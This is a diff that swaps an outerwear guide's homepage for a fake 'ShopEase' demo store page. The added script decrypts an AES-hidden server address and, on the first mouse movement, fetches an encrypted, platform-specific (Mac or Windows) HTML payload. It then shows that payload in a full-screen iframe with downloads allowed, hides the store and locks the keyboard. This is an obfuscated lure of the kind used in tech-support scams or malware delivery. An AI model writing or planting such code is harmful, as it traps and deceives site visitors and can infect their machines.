@@ -1,9 +1,312 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Independent Outerwear Field Guide | Jacket Compass Way</title><meta name="description" content="Original jacket selection, layering, construction and outerwear care guidance from Jacket Compass Way."><script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('consent','default',{analytics_storage:'denied',ad_storage:'denied',ad_user_data:'denied',ad_personalization:'denied'});gtag('js',new Date());gtag('config','G-0LY0HY7L01');</script><link rel="stylesheet" href="assets/style.css"></head><body class="home-page"><header class="map-header"><a class="map-brand" href="index.php"><span>JCW</span><b>Jacket Compass Way</b></a><nav><a href="field-method.html">Field Method</a><a href="jacket-register.html">Jacket Register</a><a href="route-journal.html">Route Journal</a><a href="contact.html">Contact</a></nav><button class="map-menu" aria-expanded="false" aria-controls="map-drawer"><span>Open map</span><i></i></button></header><div class="map-drawer" id="map-drawer" aria-hidden="true"><div><small>OUTERWEAR INDEX / 01—05</small><p>Navigate climate, layer, movement and construction before choosing a jacket.</p></div><nav><a href="index.php"><i>01</i>Base Camp</a><a href="field-method.html"><i>02</i>Field Method</a><a href="jacket-register.html"><i>03</i>Jacket Register</a><a href="route-journal.html"><i>04</i>Route Journal</a><a href="contact.html"><i>05</i>Contact</a></nav></div><main><section class="north-hero" id="home-01"><div class="hero-map"><p class="map-code">GRID 01 / OUTERWEAR FIELD GUIDE</p><h1>Find your<br><em>outer layer.</em></h1><p class="lead">Jacket Compass Way maps climate, movement and construction into useful outerwear decisions—without pretending one jacket works everywhere.</p><a class="route-link" href="jacket-register.html">Plot a jacket route <b>↗</b></a><div class="map-scale"><span>DRY</span><i></i><span>CHANGEABLE</span><i></i><span>WET</span></div></div><figure><img src="assets/images/hero.png" alt="Technical field jacket in a contemporary expedition map studio"><figcaption><b>WAYPOINT / FIELD 01</b><span>MATTE SHELL / ADAPTABLE POCKET MAP</span></figcaption></figure><div class="compass-stamp"><span>N</span><i></i><b>JCW</b><i></i><span>S</span></div></section>
-<section class="route-strip" id="home-02"><div><span>CLIMATE</span><b>045°</b><span>MOVEMENT</span><b>120°</b><span>LAYER</span><b>225°</b><span>CONSTRUCTION</span><b>315°</b><span>CLIMATE</span><b>045°</b><span>MOVEMENT</span></div></section>
-<section class="climate-compass" id="home-03"><header><p class="map-code">GRID 03 / CLIMATE COMPASS</p><h2>Start with exposure,<br>not a style name.</h2><p>Choose a route condition to see which outerwear questions move forward. Values are comparative planning cues, not certified protection ratings.</p></header><div class="compass-console"><div class="condition-tabs"><button class="active" data-weather="drizzle">Drizzle</button><button data-weather="wind">Wind</button><button data-weather="cold">Cold</button><button data-weather="variable">Variable</button></div><div class="compass-face" data-compass="drizzle"><span>N</span><i class="needle"></i><div><small>ROUTE PRIORITY</small><b data-weather-title>Surface protection + venting</b><strong data-weather-score>68</strong></div></div><aside><p data-weather-copy>Review hood coverage, closure overlap, seam construction and a realistic exit for internal moisture.</p><dl><div><dt>Layer</dt><dd data-weather-layer>Light midlayer</dd></div><div><dt>Check</dt><dd data-weather-check>Care and reproofing</dd></div></dl></aside></div></section>
-<section class="layer-route" id="home-04"><div class="route-copy"><p class="map-code">GRID 04 / LAYER ROUTE</p><h2>Leave space for<br>the layer beneath.</h2><p class="lead">Use the planner to change activity. The jacket shell stays useful only when the complete system moves, vents and fits.</p><div class="activity-buttons"><button class="active" data-activity="city">City</button><button data-activity="trail">Trail</button><button data-activity="travel">Travel</button></div></div><div class="layer-diagram"><div class="contour c1"></div><div class="contour c2"></div><div class="contour c3"></div><ol><li><span>01</span><b data-layer-one>Breathable base</b></li><li><span>02</span><b data-layer-two>Optional light mid</b></li><li><span>03</span><b data-layer-three>Weather shell</b></li></ol><p data-activity-note>Allow comfortable arm reach and room for everyday indoor-to-outdoor changes.</p></div></section>
-<section class="construction-waypoints" id="home-05"><figure><img src="assets/images/construction.png" alt="Jacket pattern pieces, closures and materials arranged in a compass system"></figure><div><p class="map-code">GRID 05 / CONSTRUCTION WAYPOINTS</p><h2>Every seam sends<br>the route somewhere.</h2><ol><li><b>01</b><span>Entry</span><small>zip, placket, collar</small></li><li><b>02</b><span>Storage</span><small>access, load, drainage</small></li><li><b>03</b><span>Movement</span><small>sleeve, shoulder, hem</small></li><li><b>04</b><span>Service</span><small>care, repair, hardware</small></li></ol></div></section>
-<section class="pocket-coordinate" id="home-06"><header><p class="map-code">GRID 06 / POCKET COORDINATES</p><h2>Storage should follow movement.</h2></header><div class="pocket-map"><article><span>A1</span><h3>Hand entry</h3><p>Comfortable access without opening the primary closure.</p></article><article><span>B4</span><h3>Secure carry</h3><p>A closed pocket positioned away from repeated flex and impact.</p></article><article><span>D2</span><h3>Internal layer</h3><p>Protected storage that remains reachable without distorting fit.</p></article><article><span>F7</span><h3>Load balance</h3><p>Useful capacity distributed so one side does not pull the garment.</p></article></div></section>
-<section class="care-bearing" id="home-07"><div><p class="map-code">GRID 07 / CARE BEARING</p><h2>Follow the label<br>back to performance.</h2><p class="lead">Select a bearing for a practical care checkpoint. Product instructions take priority over general guidance.</p></div><div class="bearing-tool"><button class="active" data-care="inspect">Inspect</button><button data-care="clean">Clean</button><button data-care="dry">Dry</button><button data-care="restore">Restore</button><div><small>NEXT BEARING</small><b data-care-title>Read the care label and closures</b><p data-care-copy>Check stains, seam wear, coating changes and damaged hardware before choosing any treatment.</p></div></div></section>
-<section class="field-dispatches" id="home-08"><header><p class="map-code">GRID 08 / FIELD DISPATCHES</p><h2>Original jacket notes for changing routes.</h2><a href="route-journal.html">Open all twelve dispatches ↗</a></header><div class="dispatch-grid"><a href="journal-01.html"><span>01</span><small>FIT / MAP</small><h3>Reading Jacket Fit Through Movement</h3><b>OPEN DISPATCH ↗</b></a><a href="journal-06.html"><span>06</span><small>POCKET / MAP</small><h3>Planning Useful Jacket Pocket Placement</h3><b>OPEN DISPATCH ↗</b></a><a href="journal-10.html"><span>10</span><small>CARE / MAP</small><h3>Storing Seasonal Jackets Responsibly</h3><b>OPEN DISPATCH ↗</b></a></div></section>
-<section class="next-waypoint" id="home-09"><div class="route-marker">09<br><small>WAYPOINT</small></div><div><p class="map-code">FINAL GRID / NEXT ROUTE</p><h2>Choose the jacket<br>the route can explain.</h2><p class="lead">Compare complete specifications, test movement with real layers and keep care instructions close.</p><a class="route-link light" href="contact.html">Contact Jacket Compass Way <b>↗</b></a></div></section></main><footer><div><h3>Explore</h3><a href="field-method.html">Field Method</a><a href="jacket-register.html">Jacket Register</a><a href="route-journal.html">Route Journal</a></div><div><h3>Contact</h3><p class="one-line">3638 Westbourne Grove, London, UK, W2 5SH, GB</p><a class="one-line" href="tel:+12125559857">+1 2125559857</a><a class="one-line" href="mailto:hello@jacketcompassway.com">hello@jacketcompassway.com</a></div><div><h3>Policies</h3><a href="privacy.html">Privacy</a><a href="terms.html">Terms</a><a href="refund.html">Refund</a><a href="shipping.html">Shipping</a></div></footer><aside class="consent"><p>Optional analytics helps improve our field notes. Advertising storage remains disabled.</p><button data-consent="accept">Allow analytics</button><button data-consent="decline">Decline</button></aside><script src="assets/app.js"></script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+</head>
+<body>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
+
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19JzfJcbkpx0lIuONyvMQ9gjcZSw7Bx/Bs36JWstdXSf0v9oWVxZd0x8lBsfAIDzu549PjWPlHakQ==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
+</body>
+</html>
